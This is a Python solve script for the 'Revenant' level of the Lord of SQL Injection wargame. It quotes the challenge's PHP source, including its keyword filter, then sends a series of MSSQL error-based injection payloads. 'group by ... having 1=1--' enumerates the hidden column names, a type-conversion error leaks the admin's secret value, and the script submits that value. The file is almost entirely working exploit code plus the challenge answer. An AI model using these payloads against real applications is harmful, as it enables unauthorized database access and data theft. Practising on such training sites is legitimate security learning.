#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    '''
    Revenant 42

    if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['id'])) exit("No Hack ~_~");
    if(preg_match('/master|sys|information|prob|;|waitfor|_/i', $_GET['pw'])) exit("No Hack ~_~");
    $query = "select * from prob_revenant where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    sqlsrv_query($db,$query);
    if(sqlsrv_errors()) exit(mssql_error(sqlsrv_errors()));

    $query = "select * from prob_revenant where id='admin'"; 
    $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
    if($result['4'] === $_GET['pw']) solve("revenant"); // you have to pwn 5th column
    '''

    url = "https://los.rubiya.kr/chall/revenant_05b27d7dea5f124118e48899d46e0b5b.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'

    payload = "' group by pw having 1=1--"
    p = los.SqlInjection(url, cook, method, inj_param, payload)
    p.resp_with_message()

    p.payload = "' group by pw,id having 1=1--"
    p.resp_with_message()

    p.payload = "' group by pw,id,[45a88487] having 1=1--"
    p.resp_with_message()

    p.payload = "' group by pw,id,[45a88487],[13477a35] having 1=1--"
    p.resp_with_message()

    p.payload = "' group by pw,id,[45a88487],[13477a35],[9604b0c8] having 1=1--"
    p.resp_with_message()

    p.payload = "admin' and \"9604b0c8\"=1 --"
    p.resp_with_message(text="Conversion failed")

    p.payload = 'aa68a4b3fb327dee07f868450f7e1183'
    response = p.my_request()
    if 'Clear!' in response:
        print('\nRevenant Clear!')


if __name__ == '__main__':
    main()
